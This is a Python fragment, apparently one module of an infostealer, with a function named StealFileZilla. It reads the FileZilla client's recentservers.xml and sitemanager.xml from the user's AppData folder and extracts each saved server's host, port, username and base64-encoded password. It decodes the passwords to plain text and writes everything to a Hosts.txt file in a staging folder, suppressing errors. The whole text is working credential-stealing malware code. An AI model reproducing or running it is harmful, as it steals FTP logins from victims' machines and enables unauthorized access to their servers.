import base64
import os
import re


async def StealFileZilla(self, directory_path: str) -> None:
    try:
        filezilla_folder = os.path.join(self.appdata, 'FileZilla')
        if not os.path.isdir(filezilla_folder):
            return
        
        filezilla_hosts = os.path.join(directory_path, "FTP Clients", 'FileZilla')
        os.makedirs(filezilla_hosts, exist_ok=True)
        recent_servers_xml = os.path.join(filezilla_folder, 'recentservers.xml')
        site_manager_xml = os.path.join(filezilla_folder, 'sitemanager.xml')

        def parse_server_info(xml_content):
            host_match = re.search(r"<Host>(.*?)</Host>", xml_content)
            port_match = re.search(r"<Port>(.*?)</Port>", xml_content)
            user_match = re.search(r"<User>(.*?)</User>", xml_content)
            pass_match = re.search(r"<Pass encoding=\"base64\">(.*?)</Pass>", xml_content)

            server_host = host_match.group(1) if host_match else ""
            server_port = port_match.group(1) if port_match else ""
            server_user = user_match.group(1) if user_match else ""
            if not server_user:
                return f"Host: {server_host}\nPort: {server_port}\n"
            encoded_pass = pass_match.group(1) if pass_match else ""
            decoded_pass = (encoded_pass and 
                            base64.b64decode(encoded_pass).decode('utf-8') if encoded_pass else "")
            return f"Host: {server_host}\nPort: {server_port}\nUser: {server_user}\nPass: {decoded_pass}\n"

        servers_info = []
        for xml_file in [recent_servers_xml, site_manager_xml]:
            if os.path.isfile(xml_file):
                with open(xml_file, 'r') as file:
                    xml_content = file.read()
                    server_entries = re.findall(r"<Server>(.*?)</Server>", xml_content, re.DOTALL)
                    for server_entry in server_entries:
                        servers_info.append(parse_server_info(server_entry))

        with open(os.path.join(filezilla_hosts, 'Hosts.txt'), 'w') as file:
            file.write("\n".join(servers_info))
            
        if len(os.listdir(filezilla_hosts)) == 0:
            os.rmdir(filezilla_hosts)
    except Exception as e:
        print(f"filezilla error - {str(e)}")
        pass